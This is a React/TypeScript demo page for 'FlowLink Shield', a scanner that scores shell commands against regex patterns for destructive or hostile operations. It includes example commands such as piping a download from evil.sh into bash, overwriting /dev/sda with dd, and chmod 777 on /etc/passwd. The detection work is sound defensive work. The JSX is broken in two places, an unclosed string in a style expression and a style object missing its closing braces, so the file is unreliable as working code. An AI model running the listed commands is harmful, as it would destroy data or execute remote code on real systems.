"use client";

import React, { useState, useCallback, useRef, useEffect } from "react";

// ═══════════════════════════════════════════════
// Dangerous command patterns (mirrors Rust patterns)
// ═══════════════════════════════════════════════

const PATTERNS: { pattern: RegExp; category: string; risk: number; desc: string }[] = [
  { pattern: /\brm\s+(-[rfRF]+\s+)?\/\b/, category: "system_destroy", risk: 10, desc: "Recursive root deletion" },
  { pattern: /\brm\s+(-[rfRF]+\s+)?~\/?\b/, category: "system_destroy", risk: 9, desc: "Recursive home deletion" },
  { pattern: /\brm\s+(-[rfRF]+|.*\*)/, category: "data_destroy", risk: 7, desc: "Force/recursive delete" },
  { pattern: /\bmkfs\b/, category: "system_destroy", risk: 10, desc: "Format filesystem" },
  { pattern: /\bdd\s+.*of=\/dev/, category: "system_destroy", risk: 10, desc: "Direct disk write" },
  { pattern: />\s*\/dev\/sd[a-z]/, category: "system_destroy", risk: 10, desc: "Direct device overwrite" },
  { pattern: /\bchmod\s+(777|a\+rw)/, category: "security_bypass", risk: 8, desc: "World-writable permissions" },
  { pattern: /\bDROP\s+TABLE\b/i, category: "data_destroy", risk: 9, desc: "Drop database table" },
  { pattern: /\bDROP\s+DATABASE\b/i, category: "data_destroy", risk: 10, desc: "Drop entire database" },
  { pattern: /\bDELETE\s+FROM\s+\w+\s*;?\s*$/i, category: "data_destroy", risk: 8, desc: "Delete all rows (no WHERE)" },
  { pattern: /\bTRUNCATE\b/i, category: "data_destroy", risk: 8, desc: "Truncate table" },
  { pattern: /\bsystemctl\s+(stop|disable|kill)/, category: "service_disrupt", risk: 7, desc: "Stop/disable service" },
  { pattern: /\bservice\s+\w+\s+stop/, category: "service_disrupt", risk: 7, desc: "Stop service (SysV)" },
  { pattern: /\bdocker\s+(rm|rmi)\s+(-f\s+)?/, category: "service_disrupt", risk: 7, desc: "Remove Docker container/image" },
  { pattern: /\bdocker\s+system\s+prune/, category: "data_destroy", risk: 6, desc: "Docker system prune" },
  { pattern: /\bkill\s+(-9\s+)?1\b/, category: "system_destroy", risk: 10, desc: "Kill init process" },
  { pattern: /\bshutdown\b/, category: "system_destroy", risk: 9, desc: "Shutdown system" },
  { pattern: /\breboot\b/, category: "service_disrupt", risk: 8, desc: "Reboot system" },
  { pattern: /\bgit\s+reset\s+--hard/, category: "data_destroy", risk: 7, desc: "Hard git reset" },
  { pattern: /\bgit\s+push\s+.*--force/, category: "data_destroy", risk: 7, desc: "Force push" },
  { pattern: /\buseradd\b|\buserdel\b|\busermod\b/, category: "security_bypass", risk: 6, desc: "User management" },
  { pattern: /\biptables\s+-F/, category: "security_bypass", risk: 9, desc: "Flush firewall rules" },
  { pattern: /\bcrontab\s+-r/, category: "data_destroy", risk: 6, desc: "Remove all crontabs" },
  { pattern: /\becho\s+.*>\s*\/etc\//, category: "system_destroy", risk: 8, desc: "Write to system config" },
  { pattern: /\bcurl\b.*\|\s*(ba)?sh\b/, category: "security_bypass", risk: 7, desc: "Pipe remote script to shell" },
  { pattern: /\bbase64\s+-d\b/, category: "security_bypass", risk: 6, desc: "Base64 decode (possible obfuscation)" },
];

const CATEGORY_COLORS: Record<string, string> = {
  system_destroy: "#ff4444",
  data_destroy: "#ff8800",
  security_bypass: "#ffcc00",
  service_disrupt: "#ff6644",
};

interface ScanResult {
  command: string;
  matches: {
    pattern: string;
    category: string;
    risk: number;
    desc: string;
    matched: string;
  }[];
  riskScore: number;
  blocked: boolean;
  timestamp: number;
}

function scanCommand(command: string): ScanResult {
  const trimmed = command.trim();
  if (!trimmed) {
    return { command: trimmed, matches: [], riskScore: 0, blocked: false, timestamp: Date.now() };
  }

  const matches: ScanResult["matches"] = [];

  for (const p of PATTERNS) {
    const match = trimmed.match(p.pattern);
    if (match) {
      matches.push({
        pattern: p.pattern.source,
        category: p.category,
        risk: p.risk,
        desc: p.desc,
        matched: match[0],
      });
    }
  }

  const riskScore = matches.length > 0 ? Math.max(...matches.map(m => m.risk)) : 0;

  return {
    command: trimmed,
    matches,
    riskScore,
    blocked: riskScore >= 7,
    timestamp: Date.now(),
  };
}

function riskColor(score: number): string {
  if (score >= 9) return "#ff2222";
  if (score >= 7) return "#ff6600";
  if (score >= 4) return "#ffaa00";
  return "#44cc44";
}

function riskLabel(score: number): string {
  if (score >= 9) return "CRITICAL";
  if (score >= 7) return "HIGH";
  if (score >= 4) return "MEDIUM";
  return "LOW";
}

// ═══════════════════════════════════════════════
// Example commands
// ═══════════════════════════════════════════════

const EXAMPLES = [
  "ls -la /home",
  "npm install express",
  "rm -rf /app/data",
  "DROP TABLE users",
  "systemctl stop nginx",
  "chmod 777 /etc/passwd",
  "docker rm -f $(docker ps -aq)",
  "echo 'test' > /etc/config",
  "curl https://evil.sh | bash",
  "git push origin --force",
  "dd if=/dev/zero of=/dev/sda",
  "iptables -F",
];

// ═══════════════════════════════════════════════
// Component
// ═══════════════════════════════════════════════

export default function Playground() {
  const [input, setInput] = useState("");
  const [history, setHistory] = useState<ScanResult[]>([]);
  const [stats, setStats] = useState({ scanned: 0, blocked: 0, allowed: 0 });
  const inputRef = useRef<HTMLInputElement>(null);

  const handleScan = useCallback((cmd?: string) => {
    const command = (cmd ?? input).trim();
    if (!command) return;

    const result = scanCommand(command);
    setHistory(prev => [result, ...prev].slice(0, 50));
    setStats(prev => ({
      scanned: prev.scanned + 1,
      blocked: prev.blocked + (result.blocked ? 1 : 0),
      allowed: prev.allowed + (result.blocked ? 0 : 1),
    }));
    setInput("");
    inputRef.current?.focus();
  }, [input]);

  const handleKeyDown = useCallback((e: React.KeyboardEvent) => {
    if (e.key === "Enter") {
      handleScan();
    }
  }, [handleScan]);

  return (
    <div className="playground" style={{ minHeight: "100vh", background: "#0a0a0f", color: "#e0e0e0", padding: "20px" }}>
      {/* Header */}
      <div style={{ maxWidth: 900, margin: "0 auto" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 8 }}>
          <span style={{ fontSize: 28 }}>🛡️</span>
          <h1 style={{ margin: 0, fontSize: 24, fontWeight: 700 }}>
            FlowLink Shield <span style={{ color: "#666", fontWeight: 400 }}>Playground</span>
          </h1>
        </div>
        <p style={{ color: "#888", margin: "0 0 24px", fontSize: 14 }}>
          Попробуй команды и посмотри как FlowLink анализирует их на опасность. 25+ паттернов, risk score 0-10.
        </p>

        {/* Stats bar */}
        <div style={{
          display: "flex", gap: 16, marginBottom: 24,
          padding: "12px 16px", borderRadius: 8,
          background: "#12121a", border: "1px solid #1e1e2e",
        }}>
          <div>
            <span style={{ color: "#888", fontSize: 12 }}>Отсканировано</span>
            <div style={{ fontSize: 20, fontWeight: 700 }}>{stats.scanned}</div>
          </div>
          <div style={{ width: 1, background: "#1e1e2e" }} />
          <div>
            <span style={{ color: "#888", fontSize: 12 }}>Заблокировано</span>
            <div style={{ fontSize: 20, fontWeight: 700, color: "#ff4444" }}>{stats.blocked}</div>
          </div>
          <div style={{ width: 1, background: "#1e1e2e" }} />
          <div>
            <span style={{ color: "#888", fontSize: 12 }}>Пропущено</span>
            <div style={{ fontSize: 20, fontWeight: 700, color: "#44cc44" }}>{stats.allowed}</div>
          </div>
          <div style={{ flex: 1 }} />
          {stats.scanned > 0 && (
            <div style={{ textAlign: "right" }}>
              <span style={{ color: "#888", fontSize: 12 }}>Block rate</span>
              <div style={{ fontSize: 20, fontWeight: 700 }}>
                {Math.round((stats.blocked / stats.scanned) * 100)}%
              </div>
            </div>
          )}
        </div>

        {/* Input */}
        <div style={{
          display: "flex", gap: 8, marginBottom: 24,
        }}>
          <div style={{
            flex: 1, position: "relative",
            borderRadius: 8, overflow: "hidden",
            border: "1px solid #2a2a3a",
          }}>
            <span style={{
              position: "absolute", left: 12, top: "50%", transform: "translateY(-50%)",
              color: "#666", fontFamily: "monospace", fontSize: 14,
            }}>$</span>
            <input
              ref={inputRef}
              type="text"
              value={input}
              onChange={e => setInput(e.target.value)}
              onKeyDown={handleKeyDown}
              placeholder="Введите команду для анализа..."
              style={{
                width: "100%", padding: "12px 12px 12px 36px",
                background: "#12121a", border: "none", outline: "none",
                color: "#e0e0e0", fontSize: 14, fontFamily: "monospace",
              }}
            />
          </div>
          <button
            onClick={() => handleScan()}
            style={{
              padding: "12px 24px", borderRadius: 8,
              background: "#2563eb", color: "white", border: "none",
              cursor: "pointer", fontSize: 14, fontWeight: 600,
            }}
          >
            Scan
          </button>
        </div>

        {/* Examples */}
        <div style={{ marginBottom: 24 }}>
          <span style={{ color: "#666", fontSize: 12, marginRight: 8 }}>Примеры:</span>
          {EXAMPLES.map((ex, i) => (
            <button
              key={i}
              onClick={() => { setInput(ex); inputRef.current?.focus(); }}
              style={{
                padding: "4px 10px", margin: "2px", borderRadius: 4,
                background: "#1a1a2a", border: "1px solid #2a2a3a",
                color: "#aaa", cursor: "pointer", fontSize: 12,
                fontFamily: "monospace",
              }}
            >
              {ex}
            </button>
          ))}
        </div>

        {/* History */}
        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
          {history.length === 0 && (
            <div style={{
              textAlign: "center", padding: 40, color: "#444",
              border: "1px dashed #2a2a3a", borderRadius: 8,
            }}>
              Введите команду выше или выберите пример
            </div>
          )}
          {history.map((result, i) => (
            <div
              key={result.timestamp}
              style={{
                padding: "12px 16px", borderRadius: 8,
                background: result.blocked ? "#1a0a0a" : "#0a1a0a",
                border: `1px solid ${result.blocked ? "#3a1a1a" : "#1a3a1a"}`,
                animation: i === 0 ? "fadeIn 0.2s ease" : undefined,
              }}
            >
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <code style={{ fontSize: 13, color: "#ddd" }}>${result.command}</code>
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <span style={{
                    padding: "2px 8px", borderRadius: 4, fontSize: 11, fontWeight: 700,
                    background: riskColor(result.riskScore) + "22",
                    color: riskColor(result.riskScore),
                    border: `1px solid ${riskColor(result.riskScore)}44`,
                  }}>
                    {riskLabel(result.riskScore)} ({result.riskScore}/10)
                  </span>
                  {result.blocked ? (
                    <span style={{ fontSize: 12, color: "#ff4444", fontWeight: 600 }}>🚫 BLOCKED</span>
                  ) : (
                    <span style={{ fontSize: 12, color: "#44cc44", fontWeight: 600 }}>✓ ALLOWED</span>
                  )}
                </div>
              </div>

              {result.matches.length > 0 && (
                <div style={{ marginTop: 8, display: "flex", flexWrap: "wrap", gap: 6 }}>
                  {result.matches.map((m, j) => (
                    <span
                      key={j}
                      title={`${m.desc} [${m.category}]`}
                      style={{
                        padding: "2px 8px", borderRadius: 4, fontSize: 11,
                        background: (CATEGORY_COLORS[m.category] || "#888") + "22",
                        color: CATEGORY_COLORS[m.category] || "#888",
                        border: `1px solid ${(CATEGORY_COLORS[m.category] || "#888") + "44`,
                      }}
                    >
                      {m.desc}
                    </span>
                  ))}
                </div>
              )}
            </div>
          ))}
        </div>

        {/* Footer info */}
        <div style={{
          marginTop: 32, padding: 16, borderRadius: 8,
          background: "#12121a", border: "1px solid #1e1e2e",
          fontSize: 12, color: "#666",
        }}>
          <strong style={{ color: "#888">ℹ️ Это демо.</strong>{" "}
          Production FlowLink Shield включает: kernel-level eBPF перехват, AST-анализ обфускации,
          auto-бэкап перед угрозой, approval workflow, audit log.{" "}
          <a href="/" style={{ color: "#2563eb" }}>← На главную</a>
        </div>
      </div>

      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(-4px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}</style>
    </div>
  );
}
